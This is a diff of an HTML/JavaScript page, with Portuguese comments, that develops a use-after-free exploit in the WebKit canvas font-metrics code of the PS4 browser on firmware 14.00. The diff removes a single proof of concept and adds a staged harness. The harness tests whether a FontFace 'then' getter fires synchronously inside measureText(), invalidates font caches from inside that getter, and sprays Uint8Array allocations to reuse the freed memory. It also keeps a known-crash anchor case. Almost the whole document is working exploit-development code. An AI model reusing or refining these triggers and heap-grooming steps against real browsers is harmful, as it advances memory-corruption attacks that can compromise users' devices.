@@ -1,26 +1,58 @@
 
 <!DOCTYPE html>
+<pre id="log"></pre>
 <script>
-// UAF FontProxy — hibrido fe938b0 + 42b1e2a
+// DIAGNOSTICO FontMetrics UAF (rdar://187946124) — PS4 FW 14.00
 //
-// Problema da adaptacao anterior:
-//   metricsOfPrimaryFont() dispara thenable-check ASSINCRONAMENTE no PS4
-//   → getter e chamado depois que measureText() retornou
-//   → fontProxy ja nao esta mais em uso → sem UAF
+// Objetivo: encontrar condicoes que tornem o UAF detectavel no main thread.
 //
-// Solucao: usar o trigger SINCRONO ja confirmado no PS4 (42b1e2a)
-//   MyTestFam como FALLBACK (nao primary) + caracter Cherokee (U+13A0)
-//   → glyph walk em width() nao encontra Cherokee em Times
-//   → cai para MyTestFam → opportunisticallyStartFontDataURLLoading
-//   → carregamento sincrono (confirmado no PS4 FW 14.00)
-//   → thenable-check dispara DENTRO de width(), DENTRO de measureTextInternal()
-//   → fontProxy (raw pointer obtido antes de width()) ainda esta sendo usado
+// Estrutura:
+//   SECAO A — deteccao de sincronicidade do getter
+//   SECAO B — tentativas de UAF com TextMetrics anomalos
+//   SECAO C — ancora de crash conhecida (42b1e2a)
 //
-// Acao do getter: context.save() × 32  (fe938b0)
-//   → reallocation do Vector m_stateStack
-//   → State antigo (com FontProxy) liberado
-//   → fontProxy DANGLING
-//   → uso posterior em measureTextInternal() → UAF
+// Metricas "normais" esperadas com Ahem 10px: ascent ~8-11, descent ~0-2
+// Sinal de UAF: NaN | 0 | valores absurdos | divergencia entre attempts
+
+var out = document.getElementById('log');
+var buf = '';
+function log(s) { buf += s + '\n'; out.textContent = buf; }
+
+var uid = 0;
+var dummyId = 0;
+var alive = [];
+
+function fontUrl(d) { return 'url("' + d + '")'; }
+
+function addDummies(n) {
+    for (var i = 0; i < n; i++) {
+        var d = document.createElement('canvas');
+        d.width = 1; d.height = 1;
+        d.getContext('2d').font = '10px "Z' + (dummyId++) + '"';
+        alive.push(d);
+    }
+}
+
+function makeCtx(fontStr) {
+    var c = document.createElement('canvas');
+    c.width = 64; c.height = 64;
+    c.style.cssText = 'position:absolute;left:-9999px';
+    document.body.appendChild(c);
+    var ctx = c.getContext('2d');
+    ctx.font = fontStr;
+    alive.push(c, ctx);
+    return ctx;
+}
+
+function metricsStr(m) {
+    return 'w=' + m.width +
+           ' ascent=' + m.actualBoundingBoxAscent +
+           ' descent=' + m.actualBoundingBoxDescent +
+           ' fontBB_asc=' + m.fontBoundingBoxAscent +
+           ' fontBB_desc=' + m.fontBoundingBoxDescent +
+           ' em_asc=' + m.emHeightAscent +
+           ' em_desc=' + m.emHeightDescent;
+}
 
 fetch('resources/Ahem.woff')
     .then(function(r) { return r.arrayBuffer(); })
@@ -34,56 +66,426 @@ fetch('resources/Ahem.woff')
     })
     .then(function(dataUrl) {
 
-        var face = new FontFace('MyTestFam', 'url("' + dataUrl + '")');
-        document.fonts.add(face);
-        void face.loaded;
+    // =====================================================================
+    // SECAO A — deteccao de sincronicidade
+    // =====================================================================
+    // A1: Times(primary) + Ahem(fallback) + Cherokee
+    //     Este e o setup que a 42b1e2a usa com fallback — deve ser SINCRONO
+    // =====================================================================
+    var tests = [
 
-        var context = document.createElement('canvas').getContext('2d');
+    {
+        id: 'A1',
+        name: 'SYNC? Times(primary) + Ahem(fallback) + Cherokee U+13A0',
+        info: 'Verifica se getter dispara DENTRO de measureText() neste setup',
+        dummies: 0,
+        crashExpected: false,
+        run: function(done) {
+            var id = uid++;
+            var face = new FontFace('AF' + id, fontUrl(dataUrl));
+            document.fonts.add(face);
+            void face.loaded;
+            alive.push(face);
 
-        // Save previo: forca m_stateStack do inline storage para o heap.
-        // Necessario para que os saves dentro do getter causem reallocation
-        // do buffer de heap (e nao apenas a transicao inline -> heap).
-        context.save();
-        context.lineWidth = 0.5;
+            var ctx = makeCtx('10px Times, AF' + id);
 
-        // MyTestFam como FALLBACK — Times nao tem glifos Cherokee (U+13A0)
-        // → o glyph walk de width() cai para MyTestFam
-        // → opportunisticallyStartFontDataURLLoading(MyTestFam) dispara
-        context.font = '10px Times, MyTestFam';
+            var firedSync = false;
+            Object.defineProperty(face, 'then', {
+                configurable: true,
+                get: function() { firedSync = true; }
+            });
 
-        var reentered = false;
-        Object.defineProperty(face, 'then', {
-            configurable: true,
-            get: function() {
-                if (reentered) return undefined;
-                reentered = true;
-                // Reallocation do Vector m_stateStack
-                // O State que contem o FontProxy apontado por fontProxy*
-                // estava no buffer antigo → buffer antigo liberado
-                // → fontProxy DANGLING apos retorno do getter
-                for (var i = 0; i < 64; i++) {
-                    context.save();
-                    context.lineWidth = 1 + i;
-                }
-                reentered = false;
-                return undefined;
+            ctx.measureText('\u13A0\u13A2\u13A4');
+
+            if (firedSync) {
+                log('  -> SINCRONO: getter disparou DENTRO de measureText()');
+                log('  -> FontMetrics UAF e potencialmente atingivel neste setup');
+            } else {
+                // verificar microtask
+                Promise.resolve().then(function() {
+                    if (firedSync) {
+                        log('  -> MICROTASK: getter disparou APOS measureText() (async)');
+                        log('  -> Setup Times+fallback+Cherokee tem comportamento async');
+                    } else {
+                        log('  -> NAO DISPAROU: getter nao foi acessado em nenhum momento');
+                    }
+                    done();
+                });
+                return; // done sera chamado dentro do Promise
             }
-        });
+            done();
+        }
+    },
 
-        // Cherokee (U+13A0): ausente em Times → cai para MyTestFam
-        // Sequencia em measureTextInternal() (versao vulneravel):
-        //   fontProxy = this->fontProxy()            ← raw ptr, State no heap
-        //   fontProxy->metricsOfPrimaryFont()        ← Times: ja carregado, ok
-        //   fontProxy->width('\u13A0\u13A2\u13A4')
-        //     → glyph walk → U+13A0 → MyTestFam
-        //     → opportunisticallyStartFontDataURLLoading(face)
-        //     → Ahem.woff data: URL → carrega SINCRONAMENTE
-        //     → FontFace.loaded fulfillado → thenable-check → face.then
-        //     → getter dispara → context.save() × 32
-        //     → Vector realloc → State antigo FREED → fontProxy DANGLING
-        //   [width() retorna]
-        //   fontProxy->qualquerCoisa()               ← UAF
-        context.measureText('\u13A0\u13A2\u13A4');
+    // =====================================================================
+    // A2: Ahem(primary) + Latin 'a' — controle, esperado async (como diagnostico)
+    // =====================================================================
+    {
+        id: 'A2',
+        name: 'SYNC? Ahem(primary) + Latin "a" [controle]',
+        info: 'Esperado: async (confirmado no diagnostico anterior)',
+        dummies: 0,
+        crashExpected: false,
+        run: function(done) {
+            var id = uid++;
+            var face = new FontFace('AF' + id, fontUrl(dataUrl));
+            document.fonts.add(face);
+            void face.loaded;
+            alive.push(face);
 
-    });
+            var ctx = makeCtx('10px AF' + id);
+            var firedSync = false;
+            Object.defineProperty(face, 'then', {
+                configurable: true,
+                get: function() { firedSync = true; }
+            });
+
+            ctx.measureText('a');
+
+            Promise.resolve().then(function() {
+                log('  -> ' + (firedSync ? 'ASYNC (apos measureText)' : 'NAO DISPAROU'));
+                done();
+            });
+        }
+    },
+
+    // =====================================================================
+    // B1: FontMetrics UAF — Times+Ahem+Cherokee + fonts.add() + 1200 dummies
+    //     Se sync (A1 confirmou): fontMetrics deveria ser liberado durante width()
+    //     UAF read -> valores de TextMetrics possivelmente anomalos
+    // =====================================================================
+    {
+        id: 'B1',
+        name: 'UAF B1: Times+Ahem+Cherokee + fonts.add() + 1200 dummies',
+        info: 'FontMetrics UAF basico — valores anomalos indicam UAF',
+        dummies: 1200,
+        crashExpected: false,
+        run: function(done) {
+            for (var attempt = 0; attempt < 2; attempt++) {
+                var id = uid++;
+                var face = new FontFace('BF' + id, fontUrl(dataUrl));
+                document.fonts.add(face);
+                void face.loaded;
+                alive.push(face);
+
+                var ctx = makeCtx('10px Times, BF' + id);
+                var reent = false;
+                Object.defineProperty(face, 'then', {
+                    configurable: true,
+                    get: function() {
+                        if (reent) return undefined;
+                        reent = true;
+                        document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
+                        reent = false;
+                    }
+                });
+
+                var m = ctx.measureText('\u13A0\u13A2\u13A4');
+                log('  attempt ' + attempt + ': ' + metricsStr(m));
+            }
+            done();
+        }
+    },
+
+    // =====================================================================
+    // B2: Mesmo que B1 mas com 3500 dummies (numero do PoC original)
+    // =====================================================================
+    {
+        id: 'B2',
+        name: 'UAF B2: Times+Ahem+Cherokee + fonts.add() + 3500 dummies',
+        info: 'Mais dummies = maior chance de pruneUnreferencedEntries liberar durante width()',
+        dummies: 3500,
+        crashExpected: false,
+        run: function(done) {
+            for (var attempt = 0; attempt < 2; attempt++) {
+                var id = uid++;
+                var face = new FontFace('BF' + id, fontUrl(dataUrl));
+                document.fonts.add(face);
+                void face.loaded;
+                alive.push(face);
+
+                var ctx = makeCtx('10px Times, BF' + id);
+                var reent = false;
+                Object.defineProperty(face, 'then', {
+                    configurable: true,
+                    get: function() {
+                        if (reent) return undefined;
+                        reent = true;
+                        document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
+                        reent = false;
+                    }
+                });
+
+                var m = ctx.measureText('\u13A0\u13A2\u13A4');
+                log('  attempt ' + attempt + ': ' + metricsStr(m));
+            }
+            done();
+        }
+    },
+
+    // =====================================================================
+    // B3: Pressao de heap dentro do getter
+    //     Apos liberar FontCascadeFonts (via fonts.add()), criar muitos
+    //     Uint8Array para tentar reutilizar o slot de memoria liberado.
+    //     Se o slot for reutilizado: fontMetrics.ascent() retorna bytes do
+    //     Uint8Array (provavelmente 0) -> valor anomalo detectavel.
+    // =====================================================================
+    {
+        id: 'B3',
+        name: 'UAF B3: B1 + pressao de heap (Uint8Array) dentro do getter',
+        info: 'Tenta forcar reutilizacao da memoria liberada do FontCascadeFonts',
+        dummies: 1200,
+        crashExpected: false,
+        run: function(done) {
+            for (var attempt = 0; attempt < 2; attempt++) {
+                var id = uid++;
+                var face = new FontFace('BF' + id, fontUrl(dataUrl));
+                document.fonts.add(face);
+                void face.loaded;
+                alive.push(face);
+
+                var ctx = makeCtx('10px Times, BF' + id);
+                var reent = false;
+                var pressure = [];
+                Object.defineProperty(face, 'then', {
+                    configurable: true,
+                    get: function() {
+                        if (reent) return undefined;
+                        reent = true;
+                        // Invalidar FontCascadeFonts
+                        document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
+                        // Pressao de heap: muitos blocos pequenos para
+                        // tentar reusar o slot liberado do FontCascadeFonts
+                        // FontCascadeFonts tem tipicamente algumas centenas de bytes
+                        for (var j = 0; j < 500; j++) {
+                            pressure.push(new Uint8Array(256));
+                        }
+                        reent = false;
+                    }
+                });
+
+                var m = ctx.measureText('\u13A0\u13A2\u13A4');
+                log('  attempt ' + attempt + ': ' + metricsStr(m));
+            }
+            done();
+        }
+    },
+
+    // =====================================================================
+    // B4: document.body.offsetTop dentro do getter (sugestao do usuario)
+    //     Forca layout sincrono durante a execucao do getter.
+    //     Objetivo: o layout pode causar operacoes adicionais no FontCascadeCache
+    //     que acelerem a liberacao do FontCascadeFonts ou causem sua reutilizacao.
+    // =====================================================================
+    {
+        id: 'B4',
+        name: 'UAF B4: B1 + document.body.offsetTop dentro do getter',
+        info: 'Layout forcado pode acelerar FontCascadeCache churn durante o getter',
+        dummies: 1200,
+        crashExpected: false,
+        run: function(done) {
+            // Adicionar texto no DOM usando a fonte para que o layout
+            // realmente precise calcular metricas de texto com ela
+            var domText = document.createElement('p');
+            domText.style.cssText = 'position:absolute;left:-9999px;font:10px "Times"';
+            domText.textContent = '\u13A0\u13A2\u13A4';
+            document.body.appendChild(domText);
+            alive.push(domText);
+
+            for (var attempt = 0; attempt < 2; attempt++) {
+                var id = uid++;
+                var face = new FontFace('BF' + id, fontUrl(dataUrl));
+                document.fonts.add(face);
+                void face.loaded;
+                alive.push(face);
+
+                var ctx = makeCtx('10px Times, BF' + id);
+                var reent = false;
+                Object.defineProperty(face, 'then', {
+                    configurable: true,
+                    get: function() {
+                        if (reent) return undefined;
+                        reent = true;
+                        document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
+                        // Layout forcado: pode interagir com FontCascadeCache
+                        void document.body.offsetTop;
+                        reent = false;
+                    }
+                });
+
+                var m = ctx.measureText('\u13A0\u13A2\u13A4');
+                log('  attempt ' + attempt + ': ' + metricsStr(m));
+            }
+            done();
+        }
+    },
+
+    // =====================================================================
+    // B5: fonts.add() multiplos dentro do getter
+    //     Mais invalidacoes = mais chances de FontCascadeCache ser consultado
+    //     e pruneUnreferencedEntries disparar DURANTE o glyph walk
+    // =====================================================================
+    {
+        id: 'B5',
+        name: 'UAF B5: B1 + fonts.add() x10 no getter (mais invalidacoes)',
+        info: 'Multiplas invalidacoes tentam forcar FontCascadeCache::get() durante width()',
+        dummies: 1200,
+        crashExpected: false,
+        run: function(done) {
+            for (var attempt = 0; attempt < 2; attempt++) {
+                var id = uid++;
+                var face = new FontFace('BF' + id, fontUrl(dataUrl));
+                document.fonts.add(face);
+                void face.loaded;
+                alive.push(face);
+
+                var ctx = makeCtx('10px Times, BF' + id);
+                var reent = false;
+                Object.defineProperty(face, 'then', {
+                    configurable: true,
+                    get: function() {
+                        if (reent) return undefined;
+                        reent = true;
+                        for (var k = 0; k < 10; k++) {
+                            document.fonts.add(
+                                new FontFace('U' + (uid++), 'local("x")')
+                            );
+                        }
+                        reent = false;
+                    }
+                });
+
+                var m = ctx.measureText('\u13A0\u13A2\u13A4');
+                log('  attempt ' + attempt + ': ' + metricsStr(m));
+            }
+            done();
+        }
+    },
+
+    // =====================================================================
+    // B6: Texto longo com muitos caracteres Cherokee
+    //     Mais iteracoes no WidthIterator = mais chamadas a glyphDataForVariant
+    //     = mais oportunidades para FontCascadeCache::get() com nova versao
+    //     = mais chances de pruneUnreferencedEntries() disparar durante width()
+    // =====================================================================
+    {
+        id: 'B6',
+        name: 'UAF B6: B3 + texto Cherokee longo (100 chars)',
+        info: 'Mais iteracoes WidthIterator = mais oportunidades para pruning em width()',
+        dummies: 1200,
+        crashExpected: false,
+        run: function(done) {
+            var longText = '';
+            for (var c = 0; c < 100; c++) {
+                longText += String.fromCharCode(0x13A0 + (c % 40));
+            }
+
+            for (var attempt = 0; attempt < 2; attempt++) {
+                var id = uid++;
+                var face = new FontFace('BF' + id, fontUrl(dataUrl));
+                document.fonts.add(face);
+                void face.loaded;
+                alive.push(face);
+
+                var ctx = makeCtx('10px Times, BF' + id);
+                var reent = false;
+                var pressure = [];
+                Object.defineProperty(face, 'then', {
+                    configurable: true,
+                    get: function() {
+                        if (reent) return undefined;
+                        reent = true;
+                        document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
+                        for (var j = 0; j < 500; j++) {
+                            pressure.push(new Uint8Array(256));
+                        }
+                        reent = false;
+                    }
+                });
+
+                var m = ctx.measureText(longText);
+                log('  attempt ' + attempt + ': ' + metricsStr(m));
+            }
+            done();
+        }
+    },
+
+    // =====================================================================
+    // C1: ANCORA — padrao 42b1e2a [CRASH ESPERADO]
+    //     Se nenhum B causou crash, este deve crashar como referencia.
+    // =====================================================================
+    {
+        id: 'C1',
+        name: '2 faces MESMA familia + 0 dummies [CRASH ESPERADO — ancora]',
+        info: 'Padrao original 42b1e2a confirmado. Valida que a sessao ainda funciona.',
+        dummies: 0,
+        crashExpected: true,
+        run: function(done) {
+            var id = uid++;
+            var f1 = new FontFace('CF' + id, fontUrl(dataUrl));
+            var f2 = new FontFace('CF' + id, fontUrl(dataUrl));
+            document.fonts.add(f1);
+            document.fonts.add(f2);
+            void f1.loaded; void f2.loaded;
+            alive.push(f1, f2);
+
+            var trap = function() {
+                document.fonts.add(new FontFace('U' + (uid++), 'local("x")'));
+            };
+            Object.defineProperty(f1, 'then', { get: trap });
+            Object.defineProperty(f2, 'then', { get: trap });
+
+            var ctx = makeCtx('10px Times, CF' + id);
+            ctx.measureText('\u13A0\u13A2\u13A4');
+            done();
+        }
+    }
+
+    ]; // fim tests
+
+    // =====================================================================
+    // Runner sequencial
+    // =====================================================================
+    var idx = 0;
+    function next() {
+        if (idx >= tests.length) {
+            log('\n=== TODOS OS TESTES CONCLUIDOS SEM CRASH ===');
+            return;
+        }
+        var t = tests[idx++];
+        var crashTag = t.crashExpected ? ' [CRASH ESPERADO]' : '';
+        log('--- ' + t.id + ': ' + t.name + crashTag);
+        log('    ' + t.info);
+
+        setTimeout(function() {
+            if (t.dummies > 0) {
+                log('    Adicionando ' + t.dummies + ' dummies (total acumulado: ~' + dummyId + ')...');
+            }
+            addDummies(t.dummies);
+
+            log('    [EXECUTANDO] <<<');
+            setTimeout(function() {
+                var isDone = false;
+                var doneCb = function() {
+                    if (!isDone) {
+                        isDone = true;
+                        log('    PASSOU\n');
+                        next();
+                    }
+                };
+                t.run(doneCb);
+                // fallback se run() nao chamar done()
+                // (casos sync chamam done() diretamente)
+            }, 200);
+        }, 150);
+    }
+
+    log('=== DIAGNOSTICO FontMetrics UAF — PS4 FW 14.00 ===');
+    log('Ahem.woff OK. Metricas normais: ascent ~8, fontBB ~11, descent ~0-2');
+    log('Sinal de UAF: valores 0, NaN, negativos, absurdos ou divergentes\n');
+    next();
+
+}).catch(function(e) {
+    document.getElementById('log').textContent = 'ERRO: ' + e.message;
+});
 </script>
